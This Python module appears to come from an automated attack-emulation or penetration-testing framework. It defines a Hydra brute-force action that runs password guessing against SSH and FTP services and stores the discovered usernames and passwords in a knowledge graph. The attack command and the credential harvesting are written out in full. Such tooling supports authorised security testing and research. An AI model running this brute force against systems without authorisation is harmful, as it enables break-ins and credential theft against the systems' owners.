import json
from pathlib import Path
from typing import Union

from action_state_interface.action import Action, StateChangeSequence
from action_state_interface.action_utils import shell
from action_state_interface.exec import ActionExecutionResult
from artefacts.ArtefactManager import ArtefactManager
from kg_api import Entity, GraphDB, MultiPattern, Pattern, Relationship
from kg_api.query import Query
from kg_api.utils import safe_add_user
from Session import SessionManager
from motifs import ActionInputMotif, ActionOutputMotif, StateChangeOperation


class HydraBruteForceAction(Action):
    """
    Perform a brute-force attack using Hydra on a specific service (e.g., SSH, FTP) associated with an asset.
    This action is performed against Service entities.
    """

    def __init__(self):
        super().__init__("HydraBruteForce", "T1110", "TA0006", ["quiet", "fast"])
        self.noise = 1
        self.impact = 0.8
        self.input_motif = self.build_input_motif()
        self.output_motif = self.build_output_motif()

    @classmethod
    def build_input_motif(cls) -> ActionInputMotif:
        """
        Build the input motif for HydraBruteForceAction.
        """
        input_motif = ActionInputMotif(
            name="InputMotif_HydraBruteForceAction",
            description="Input motif for HydraBruteForceAction"
        )

        input_motif.add_template(
            template_name="existing_asset",
            entity=Entity('Asset', alias='asset'),
        )

        input_motif.add_template(
            template_name="existing_port",
            entity=Entity('OpenPort', alias='port'),
            match_on="existing_asset",
            relationship_type="has",
            invert_relationship=True,
        )

        input_motif.add_template(
            template_name="existing_service",
            entity=Entity('Service', alias='service'),
            match_on="existing_port",
            relationship_type="is_running",
            invert_relationship=True,
        )

        return input_motif

    @classmethod
    def build_output_motif(cls) -> ActionOutputMotif:
        """
        Build the output motif for HydraBruteForceAction.

        Defines templates for:
        - Credentials entity (linked to service via secured_with relationship)
        - User entity (linked to service via is_client relationship)
        """
        output_motif = ActionOutputMotif(
            name="OutputMotif_HydraBruteForceAction",
            description="Output motif for HydraBruteForceAction"
        )

        # Template for Credentials entity
        # This will be instantiated with match_on_override to match on the service from input pattern
        # match_on is set to Entity('Service') as a placeholder (will be overridden during instantiation)
        output_motif.add_template(
            entity=Entity('Credentials', alias='creds'),
            template_name="discovered_credentials",
            match_on=Entity('Service'),
            relationship_type='secured_with',
            operation=StateChangeOperation.MERGE_IF_NOT_MATCH
        )

        # Template for User entity
        # This will be instantiated with match_on_override to match on the service from input pattern
        # match_on is set to Entity('Service') as a placeholder (will be overridden during instantiation)
        output_motif.add_template(
            entity=Entity('User', alias='user'),
            template_name="discovered_user",
            match_on=Entity('Service'),
            relationship_type='is_client',
            invert_relationship=False,  # User -[is_client]-> Service (relationship is inverted in schema)
            operation=StateChangeOperation.MERGE_IF_NOT_MATCH
        )

        return output_motif

    def expected_outcome(self, pattern: Pattern) -> list[str]:
        """
        Return expected outcome of action.
        """
        return [
            f"Gain access to {pattern.get('service').get('protocol')} service ({pattern.get('service')._id}) "
            f"on {pattern.get('asset').get('ip_address')}"
        ]

    def get_target_query(self) -> Query:
        """
        Identify target patterns with Asset -> Path -> Service (selected service).
        """
        query = self.input_motif.get_query()
        query.where(self.input_motif.get_template('existing_service').entity.protocol.is_in(['ftp', 'ssh']))
        query.ret_all()
        return query

    def function(self, sessions: SessionManager, artefacts: ArtefactManager, pattern: Pattern) -> ActionExecutionResult:
        """
        Use Hydra to perform brute-force attack.
        """
        asset = pattern.get('asset')
        ip_address = asset.get('ip_address')
        service = pattern.get('service')
        protocol = service.get('protocol')

        if protocol not in ['ftp', 'ssh']:
            raise ValueError(f"Unsupported protocol: {protocol}")

        in_uuid = artefacts.search(f'dpl4hydra_{protocol}.lst')[0]
        password_list = artefacts.get_path(in_uuid)

        if not Path(password_list).exists():
            raise FileNotFoundError(f"Password list not found: {password_list}")

        if protocol == 'ssh':
            no_tasks = 4
        else:
            no_tasks = 16

        out_uuid = artefacts.placeholder('hydra-brute-force-output.json')
        output_path = artefacts.get_path(out_uuid)

        # Execute Hydra
        execres = shell(
            "hydra",
            [
                "-C",
                str(password_list),
                "-o",
                str(output_path),
                "-b",
                "json",
                f"-t{str(no_tasks)}",
                f"{protocol}://{ip_address}",
            ],
        )

        execres.artefacts["scan_results_json"] = out_uuid
        return execres

    def parse_output(self, output, artefacts: ArtefactManager) -> dict:
        """
        Parse the output of the HydraBruteForceAction.
        """
        with artefacts.open(output.artefacts["scan_results_json"], 'r') as f:
            results = json.load(f)

        discovered_credentials = []
        for result in results.get('results', []):
            username = result.get('login')
            password = result.get('password')
            if username and password:
                discovered_credentials.append({
                    'username': username,
                    'password': password
                })

        return {
            "discovered_credentials": discovered_credentials
        }

    def populate_output_motif(self, kg: GraphDB, pattern: Pattern, discovered_data: dict) -> StateChangeSequence:
        """
        Populate output motif templates using the motif instantiation system.
        
        This method:
        1. Resets the output motif context for this execution
        2. Instantiates the discovered_credentials template for each discovered credential
        3. Instantiates the discovered_user template for each discovered user
        
        Args:
            kg: GraphDB instance
            pattern: Input pattern containing the asset and service
            discovered_data: Dictionary containing parsed credential data
            
        Returns:
            StateChangeSequence containing all state changes
        """
        self.output_motif.reset_context()

        service = pattern.get('service')

        changes: StateChangeSequence = []        
        for cred_data in discovered_data["discovered_credentials"]:
            username = cred_data['username']
            password = cred_data['password']
            
            # Instantiate credentials template using motif system
            cred_change = self.output_motif.instantiate(
                "discovered_credentials",
                match_on_override=service,
                username=username,
                password=password
            )
            changes.append(cred_change)
            
            # Instantiate user template using motif system
            user_change = self.output_motif.instantiate(
                "discovered_user",
                match_on_override=service,
                username=username
            )
            changes.append(user_change)
        return changes

    def capture_state_change(
        self, kg: GraphDB, artefacts: ArtefactManager, pattern: Pattern, output: ActionExecutionResult
    ) -> StateChangeSequence:
        """
        Parse the Hydra brute-force output and create state changes for discovered credentials.
        
        This method:
        1. Parses the JSON output to extract successful credentials
        2. Creates state changes to add credentials and users to the knowledge graph
        """
        discovered_data = self.parse_output(output, artefacts)
        changes = self.populate_output_motif(kg, pattern, discovered_data)
        return changes